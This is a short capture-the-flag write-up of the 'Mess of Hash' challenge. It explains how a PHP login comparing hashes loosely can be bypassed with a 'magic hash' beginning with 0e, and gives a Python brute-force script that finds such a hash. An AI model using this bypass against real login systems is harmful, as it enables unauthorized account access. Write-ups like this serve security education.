# Internetwache : Mess of Hash

#### Author: Wh1t3Fox

**Description**:
```
<?php

$admin_user = "pr0_adm1n";
$admin_pw = clean_hash("0e408306536730731920197920342119");

function clean_hash($hash) {
    return preg_replace("/[^0-9a-f]/","",$hash);
}

function myhash($str) {
    return clean_hash(md5(md5($str) . "SALT"));
}
```

After lots of Googling and fighting with what to do we found a helpful post.
[https://www.whitehatsec.com/blog/magic-hashes/](https://www.whitehatsec.com/blog/magic-hashes/)

The idea behind this is that a hash that starts with 0e followed by numbers is translated to
scientific notation, and therefore becomes 0. To login to the website we needed to find a hash
that was the same format. We wrote a script to compute hashes until we found one that met our
requirements. After about 10 minutes we found a hash.

### Code

    import hashlib
    import itertools
    import re

    alphabet = map(chr, range(0x21, 0x7F))

    for x in itertools.product(alphabet, repeat=5):
        md51 = hashlib.md5()
        md52 = hashlib.md5()
        md51.update(''.join(x))
        md52.update(md51.hexdigest())
        md52.update('SALT')
        tmp = md52.hexdigest()
        if re.match(r'^0e\d+$', tmp):
            print ''.join(x), tmp
            break
